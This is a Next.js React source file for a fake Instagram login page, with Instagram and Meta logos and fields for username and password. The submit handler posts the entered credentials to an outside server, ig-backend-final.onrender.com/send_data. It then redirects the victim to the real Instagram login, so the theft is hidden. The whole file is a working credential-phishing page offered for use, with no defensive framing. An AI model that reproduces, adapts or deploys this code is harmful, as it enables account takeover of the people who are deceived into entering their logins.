'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    // Yahan apni backend API call likho
    let res = await fetch('https://ig-backend-final.onrender.com/send_data', {
      "method": "POST",
      "headers": { "Content-Type": "application/json" },
      "body": JSON.stringify({ email, password })
    })
    let data = await res.json();
    setEmail("")
    setPassword("")


    // Simulation ke liye 2 second wait kar rahe hain
    setTimeout(() => {
      setIsLoading(false);
      // router.push('/dashboard'); // Redirect example
      window.location.href = "https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav";
    }, 2000);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-900 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-6xl w-full">
        <div>
          <p className="text-center text-gray-500">
            English (US)
          </p>
            <img src="/insta_logo.webp" alt="Insta Logo" className="w-32 mx-auto my-5"/>
        </div>

        <form className="mt-15 space-y-6" onSubmit={handleSubmit}>
          <div className="rounded-md shadow-sm space-y-5">
            <div>
              <input
                id="email-address"
                name="email"
                type="text"
                autoComplete="email"
                required
                className="rounded-xl relative  w-full px-4  py-4 border border-gray-500 placeholder-gray-400 text-white focus:outline-none focus:ring-indigo-500 focus:border-white focus:z-10 text-md"
                placeholder="Username, email or mobile number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                required
                className="rounded-xl relative  w-full px-4  py-4 border border-gray-500 placeholder-gray-400 text-white focus:outline-none focus:ring-indigo-500 focus:border-white focus:z-10 texgt-md"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <div>
            <button
              type="submit"
              disabled={isLoading}
                className={`rounded-4xl text-md border focus:border-indigo-500 focus:z-10  group relative w-full flex justify-center py-3 px-4 border-transparent bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 ${isLoading ? 'opacity-75 cursor-not-allowed' : ''
                }`}
            >
                {isLoading ? 'Logging in...' : 'Log in'}
              </button>
            </div>
          </div>

          <div className="flex items-center justify-center">
              <a href="#" className="text-md text-white hover:text-gray-200">
                Forgot password?
              </a>
          </div>

          <div className='mt-20 space-y-5'>
            <div className="rounded-3xl w-full py-2 border border-blue-400 text-blue-400 focus:outline-none focus:ring-indigo-400 text-center text-md">
              Create new account
            </div>
            <div className="text-sm text-white flex justify-center items-center space-x-0">
              <img src="/meta_logo.webp" alt="Meta Logo" className="w-4 mx-1" />
              Meta
            </div>
          </div>
        </form>
      </div>
    </div>
  );
}   